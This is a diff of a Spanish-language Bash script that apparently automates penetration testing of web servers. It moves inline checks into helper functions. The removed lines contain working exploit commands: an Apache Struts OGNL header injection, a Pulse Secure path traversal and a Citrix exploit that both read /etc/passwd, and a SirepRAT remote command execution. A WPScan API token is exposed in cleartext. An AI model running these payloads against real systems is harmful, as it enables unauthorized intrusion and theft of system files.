-								echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m sharepoint -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando archivos comunes de webservices ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webservices -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"								
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backdoorIIS -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_webshell.txt
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_webshell.txt >> .vulnerabilidades/"$subdominio"_"$port"_webshell.txt
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_backupWeb.txt
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_backupWeb.txt  >> .vulnerabilidades/"$subdominio"_"$port"_webarchivos.txt 
-								sleep 1	
+							if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
+								enumeracionIIS "http" $subdominio $port
 							else
 								echo -e "\t\t[+] No es IIS o no debemos escanear"									   
 							fi
@@ -2173,181 +3282,28 @@ then
 							#######  if the server is tomcat ######
 							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
 							greprc=$?				
-							if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
-								
-								echo -e "\t\t[+] Revisando Apache Struts"
-								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$subdominio:$port/" > logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt 2>/dev/null
-								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt > .vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt
-						  		  
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios comunes ($subdominio - Tomcat)"								
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m folders -s 0 -q 1 >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &			
-									sleep 1;
-								fi									
-								
-								echo -e "\t\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m tomcat -s 0 -q 1  > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								
-								sleep 1;
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt &  
-								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1	
+							if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes																							
+								enumeracionTomcat "http" $subdominio $port															
 							else
-								echo -e "\t\t[+] No es tomcat o no debemos escanear"									
+								echo -e "\t\t[+] No es tomcat o no debemos escanear"
 							fi
 										
 							####################################
-				
-							#######  drupal (domain) ######
-							grep -qi drupal .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 										
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de drupal ($subdominio)"
-								droopescan scan drupal -u  http://$subdominio --output json > logs/vulnerabilidades/"$subdominio"_"$port"_droopescan.txt								
-								cat logs/vulnerabilidades/"$subdominio"_"$port"_droopescan.txt > .enumeracion/"$subdominio"_"$port"_droopescan.txt																																								
-							fi
-
-							#######  wordpress (domain) ######
-							grep -qi wordpress .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
-								wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url http://$subdominio --format json > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								wpscan --disable-tls-checks  --random-user-agent --url http://$subdominio/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
-								
-
-								#msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
-								
-								grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								greprc=$?
-								if [[ $greprc -eq 0 ]];then 		
-									echo -e "\t\t\t[+] Redireccion en wordpress"
-									url=`cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
-									
-									wpscan --disable-tls-checks --enumerate u  --random-user-agent --url $url > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt									
-									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
-									
-								fi
-	
-								grep "Title" logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "Title" -m1 -b3 -A19 >> logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								if [[ ! -s .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt  ]] ; then
-									strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "out of date" -m1 -b3 -A19 >> logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-									cp logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								fi
-								
-
-								
-								strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$subdominio"_"$port"_configuracionInseguraWordpress.txt
-								cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | wpscan-parser.py > .vulnerabilidades/"$subdominio"_"$port"_wpUsers.txt
-								grep -i users logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt -m1 -b1 -A20 > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers.txt
-							fi
-														
-							###################################	 
-
-							#######  citrix (domain) ######
-							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 								
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
-								
-								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
-								egrep --color=never "root" logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt > .vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
-								
-							fi
-							###################################	
-							
-							#######  Pulse secure (domain) ######
-							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 								
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
-								
-								curl --path-as-is -s -k "http://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
-								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt > .vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
-								
-							fi
-							##################################		
-							
-							
-							#######  OWA (domain) ######
-							egrep -qi "Outlook|owa" .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
-								
-								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
-								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt > .vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
-								
-							fi
-							###################################		
-
-
-							#######  grafana (domain) ######
-							egrep -qi "Grafana" .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de Grafana($subdominio)"
-								
-								grafana.py -H $subdominio -p $port  > logs/vulnerabilidades/"$subdominio"_"$port"_grafana.txt 2>/dev/null
-								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_grafana.txt > .vulnerabilidades/"$subdominio"_"$port"_grafana.txt
-								
-							fi
-							###################################	
-							
-							
-							
-							#######  joomla (domain) ######
-							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 										
-								echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($subdominio)"
-								joomscan.sh -u http://$subdominio/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$subdominio"_"$port"_joomscan.txt &
-								
-								JoomlaJCKeditor.py --url "http://$subdominio" > .vulnerabilidades/"$subdominio"_"$port"_JoomlaJCKeditor.txt
-							fi
-							###################################	
-							
-							#######  WAMPSERVER (domain) ######
-							grep -qi WAMPSERVER .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 										
-								echo -e "\t[+] Enumerando WAMPSERVER ($subdominio)"
-								wampServer.pl -url http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_WAMPSERVER.txt &
-							fi
-							###################################	
+							echo -e "\t\t[+] Enumerar CMSs"
+							enumeracionCMS "http" $subdominio $port	
+							####################################							
 															
 						else
 							echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
 						fi												
 					done #subdominio
-										
 
-					#######  clone site (domain) ####### 									
-					cd webClone
-						echo -e "\t\t[+] Clonando sitio ($subdominio) tardara un rato"	
-						wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio 2>/dev/null
-						rm index.html.orig 2>/dev/null
 
-						echo ""
-						echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
-						grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
-						lines=`wc -l http.txt  | cut -d " " -f1`
-						perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-						paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMINIO"_web_wget2.txt # adicionar http:// a cada linea
-						rm http.txt 2>/dev/null
-					
-						grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
-						lines=`wc -l https.txt  | cut -d " " -f1`
-						perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-						paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMINIO"_web_wget2.txt  # adicionar https:// a cada linea
-						rm https.txt 2>/dev/null						
-					cd ../
-					###################################				    
-					#done 									
+					####################################
+					echo -e "\t\t[+] Clonar sitios"
+					cloneSite "http" $subdominio $port	
+					####################################	
+													    								
 				fi #rev por dominio
 				################################
 				
@@ -2395,171 +3351,19 @@ then
 				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
 					echo "Realizando tests adicionales "	
 					echo $checksumline >> webClone/checksumsEscaneados.txt
-					if [ $internet == "s" ]; then 
-						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
-						wafw00f http://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
-						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt										
-					fi	
+					
+					echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
+					wafw00f http://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
+					grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt										
 
+					echo -e "\t\t[+] Revisando vulnerabilidades CMS"
+					enumeracionCMS "http" $ip $port
 
-					echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
-					nmap -Pn -p $port --script=http-vuln* $ip >> logs/vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt
-					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt > .vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt
-					sleep 1
-
-					#######  drupal (IP) ######
-					grep -qi drupal .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de drupal ($ip)"
-						droopescan scan drupal -u  https://$ip --output json > logs/vulnerabilidades/"$ip"_"$port"_droopescan.txt								
-						cat logs/vulnerabilidades/"$ip"_"$port"_droopescan.txt  > .enumeracion/"$ip"_"$port"_droopescan.txt																																								
-					fi
-
-					#######  wordpress (IP) ######
-					grep -qi wordpress .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($ip)"
-						wpscan  --update >/dev/null						
-						wpscan --enumerate u  --random-user-agent --url http://$ip --format json > logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt
-						wpscan --random-user-agent --url http://$ip/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt
-								
-						grep "Title"  logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$ip"_"$port"_pluginDesactualizado.txt
-						grep "XML-RPC seems" logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | awk '{print $7}' > .vulnerabilidades/"$ip"_"$port"_configuracionInseguraWordpress.txt
-						cat logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt | wpscan-parser.py > .vulnerabilidades/"$ip"_"$port"_wpUsers.txt						
-					fi
-					###########################
-					
-					
-					#######  citrix (ip) ######
-					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
-							
-						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
-						egrep --color=never "root" logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt > .vulnerabilidades/"$ip"_"$port"_citrixVul.txt
-						
-					fi
-					###################################	
-					
-					
-					#######  Pulse secure (ip) ######
-					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
-						
-						curl --path-as-is -s -k "http://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
-						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt > .vulnerabilidades/"$ip"_"$port"_pulseVul.txt
-						
-					fi
-					###################################		
-					
-																		
-					
-					#######  OWA (ip) ######
-					egrep -qi "Outlook|owa" .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
-						
-						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
-						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt > .vulnerabilidades/"$ip"_"$port"_owaVul.txt
-						
-					fi
-					###################################	
-
-					#######  grafana (domain) ######
-					egrep -qi "Grafana" .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de Grafana($ip)"
-						
-						grafana.py -H $ip -p $port  > logs/vulnerabilidades/"$ip"_"$port"_grafana.txt 2>/dev/null
-						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_grafana.txt > .vulnerabilidades/"$ip"_"$port"_grafana.txt
-						
-					fi
-					###################################	
-					
-				
-					#######  joomla (ip) ######
-					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 										
-						echo -e "\t\t[+] Revisando vulnerabilidades de joomla (IP)"
-						joomscan.sh -u http://$ip/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_joomscan.txt &
-						
-						JoomlaJCKeditor.py --url "http://$ip" > .vulnerabilidades/"$ip"_"$port"_JoomlaJCKeditor.txt
-					fi
-					###################################		
-
-					#######  WAMPSERVER (ip) ######
-					grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 										
-						echo -e "\t[+] Enumerando WAMPSERVER (IP)"
-						wampServer.pl -url http://$ip/ > .enumeracion/"$ip"_"$port"_WAMPSERVER.txt &
-					fi
-					###################################					
-				
-					
-					
 					#######  if the server is IIS ######
 					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare"  # no redirecciona
 					greprc=$?
-					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
-						
-						
-						egrep -iq "IIS/6.0|IIS/5.1" .enumeracion/"$ip"_"$port"_webData.txt
-						IIS6=$?
-						if [[ $IIS6 -eq 0 ]];then
-							echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($ip - IIS)"
-							echo "nmap -n -sT -p $port --script=http-iis-webdav-vuln $ip" >> logs/vulnerabilidades/"$ip"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
-							nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $ip >> logs/vulnerabilidades/"$ip"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 					
-							grep "|" logs/vulnerabilidades/"$ip"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_IISwebdavVulnerable.txt 					
-						
-						fi
-																		
-						echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($ip - IIS)"
-						echo "nmap -p $port --script http-vuln-cve2015-1635.nse $ip" >> logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt
-						nmap -Pn -p $port --script http-vuln-cve2015-1635.nse $ip >> logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt
-						grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt >> .vulnerabilidades/"$ip"_"$port"_HTTPsys.txt
-						
-						echo -e "\t\t[+] Revisando directorios comunes ($ip -IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando paneles administrativos ($ip -IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_admin.txt 
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip -IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($ip -IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m sharepoint -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos comunes de webservices ($ip -IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webservices -s 0 -q 1  > logs/enumeracion/"$ip"_"$port"_webarchivos.txt 
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando la existencia de backdoors ($ip -IIS)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backdoorIIS -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  >> .vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando la existencia de backups de archivos de configuración ($ip -IIS)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webBackups.txt  
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webBackups.txt   >> .vulnerabilidades/"$ip"_"$port"_webBackups.txt  
-						sleep 1	
+					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes						
+						enumeracionIIS "http" $ip $port						
 					else
 						echo -e "\t\t[+] No es IIS o no debemos escanear"
 					fi
@@ -2572,22 +3376,7 @@ then
 					greprc=$?				
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
 					
-						echo -e "\t\t[+] Revisando Apache struts"					
-						curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$ip:$port/" > logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt 2>/dev/null					
-						grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt > .vulnerabilidades/"$ip"_"$port"_apacheStruts.txt
-						
-						echo -e "\t\t[+] Revisando directorios comunes ($ip -Tomcat)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de tomcat ($ip -Tomcat)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m tomcat -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt 
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip -Tomcat)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1	
+						enumeracionTomcat "http" $ip $port	
 					else
 						echo -e "\t\t[+] No es Tomcat o no debemos escanear"
 					fi
@@ -2595,113 +3384,21 @@ then
 					####################################	
 			
 
-					
-					egrep -iq "Windows Device Portal" .enumeracion/"$ip"_"$port"_webData.txt 
-					greprc=$?
-					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
-						echo -e "\t\t[+] Revisando SirepRAT ($ip)"
-						SirepRAT.sh $ip LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$ip"_"$port"_SirepRAT.txt
-						grep -ia 'IPv4' logs/vulnerabilidades/"$ip"_"$port"_SirepRAT.txt > .vulnerabilidades/"$ip"_"$port"_SirepRAT.txt
-
-					fi
-
-
 					#######  if the server is apache ######
-					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare" # solo el segundo egrep poner "-q"
+					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare" # solo el segundo egrep poner "-q"
 					greprc=$?
-					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
-													
-						#echo -e "\t\t[+] Revisando vulnerabilidad Struts"
-						#echo "nmap -n -sT -p $port $ip --script=http_vuln-cve2017-5638" > logs/vulnerabilidades/"$ip"_"$port"_Struts.txt 2>/dev/null 
-						#nmap -n -sT -p $port $ip --script=http_vuln-cve2017-5638 >> logs/vulnerabilidades/"$ip"_"$port"_Struts.txt 2>/dev/null 
-						#grep "|" logs/vulnerabilidades/"$ip"_"$port"_Struts.txt > .vulnerabilidades/"$ip"_"$port"_Struts.txt  	
-											
-						#echo -e "\t\t[+] Revisando vulnerabilidad cgi"
-						#echo "nmap -n -sT -p $port $ip --script=http_vuln-cve2012-1823" > logs/vulnerabilidades/"$ip"_"$port"_cgi.txt 2>/dev/null 
